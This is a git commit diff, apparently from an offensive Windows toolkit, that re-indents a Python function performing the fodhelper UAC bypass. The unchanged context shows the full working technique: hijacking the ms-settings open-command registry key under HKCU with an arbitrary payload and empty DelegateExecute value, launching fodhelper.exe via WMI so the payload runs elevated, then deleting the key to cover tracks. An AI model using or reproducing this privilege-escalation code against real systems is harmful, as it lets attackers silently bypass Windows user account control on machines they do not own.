8786ee50b343dd813d078d19f0946e233f325a4f
rootm0s <rickardmalmkvist@hotmail.com>
2018-05-24 22:30:49 +0200

    Update uac_fodhelper.py

--- functions/uac_fodhelper.py
+++ functions/uac_fodhelper.py
@@ -31,19 +31,19 @@ def fodhelper(payload):
 	print_info("Hijacking Software\\Classes\\ms-settings\\shell\\open\\command")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\ms-settings\shell\open\command"))
+					os.path.join("Software\Classes\ms-settings\shell\open\command"))
 									
 		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
 
 		_winreg.SetValueEx(key,
-							"DelegateExecute",
-							0,
-							_winreg.REG_SZ,
-							None)
+				"DelegateExecute",
+				0,
+				_winreg.REG_SZ,
+				None)
 
 		_winreg.CloseKey(key)
 		print_success("Successfully created Default and DelegateExecute key")
@@ -57,7 +57,7 @@ def fodhelper(payload):
 	print_info("Attempting to create process (cmd.exe /c start fodhelper.exe)")
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start fodhelper.exe",
-										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
 		if (result[1] == 0):
 			print_success("Process started successfully (cmd.exe /c start fodhelper.exe)")
 		else:
@@ -73,7 +73,7 @@ def fodhelper(payload):
 	print_info("Attempting to delete and restore hijacked registry keys")
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-						os.path.join("Software\Classes\ms-settings\shell\open\command"))
+				os.path.join("Software\Classes\ms-settings\shell\open\command"))
 		print_success("Successfully, our payload ({}) should now run elevated".format(payload))
 	except Exception as error:
 		print_error("Unable to clean")
